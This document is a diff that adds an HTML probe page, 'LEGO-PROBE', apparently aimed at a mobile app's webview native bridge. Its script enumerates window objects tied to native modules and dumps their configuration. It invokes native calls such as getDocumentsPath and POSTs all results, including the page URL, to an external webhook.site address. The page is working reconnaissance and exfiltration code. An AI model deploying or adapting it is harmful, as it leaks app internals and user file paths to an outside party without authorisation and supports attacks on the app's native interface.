@@ -1,0 +1,33 @@
+<!doctype html><html><head><meta charset="utf-8"><title>LEGO-PROBE</title></head>
+<body style="font:13px monospace;padding:8px"><h3>LEGO-PROBE</h3><pre id="o">start</pre>
+<script>
+var HOOK='https://webhook.site/e3b6a0b9-a911-4f7c-baf1-ffd6852f08e2';
+function log(s){try{document.getElementById('o').textContent+='\n'+s}catch(e){}}
+function post(t,d){try{fetch(HOOK,{method:'POST',body:t+'\n'+JSON.stringify(d)})}catch(e){}}
+var out={href:location.href};
+// 1) 找所有可能的 lego/原生调用入口
+var names=['nativeModuleProxy','__legoNativeServiceConfig','legoNativeService','nativeProxy','lego','__lego','NativeModuleProxy','nativeService','__legoNativeServiceInvoker'];
+out.cand={};
+names.forEach(function(n){
+  try{ var v=window[n]; if(typeof v!=='undefined'){ var m=[]; try{m=Object.getOwnPropertyNames(v)}catch(e){}
+    out.cand[n]={type:typeof v, keys:m.slice(0,60)}; } }catch(e){}
+});
+// 2) 扫 window 上所有含 lego/native/proxy 的键
+out.keys=[];
+try{ Object.getOwnPropertyNames(window).forEach(function(k){ if(/lego|native|proxy|module/i.test(k)) out.keys.push(k) }); }catch(e){}
+// 3) dump __legoNativeServiceConfig 结构（截断）
+try{ var c=window.__legoNativeServiceConfig; out.config=(c===undefined?'undefined':JSON.stringify(c).substr(0,2000)); }catch(e){ out.config='ERR '+e }
+log(JSON.stringify(out.cand).substr(0,600));
+log('keys='+out.keys.join(','));
+log('config='+(out.config||'').substr(0,500));
+post('LEGO_PROBE', out);
+// 4) 若存在 nativeModuleProxy，尝试无害调用确认可达
+try{
+  var p=window.nativeModuleProxy;
+  if(p && typeof p.call==='function'){
+    try{ var r=p.call('Launch','canLaunchUrlString',{url:'https://example.com'}); out.call_canLaunch=''+r; }catch(e){ out.call_canLaunch='ERR '+e }
+    try{ var r2=p.call('Path','getDocumentsPath',{}); out.call_path=''+r2; }catch(e){ out.call_path='ERR '+e }
+    post('LEGO_CALLS', out);
+  }
+}catch(e){}
+</script></body></html>
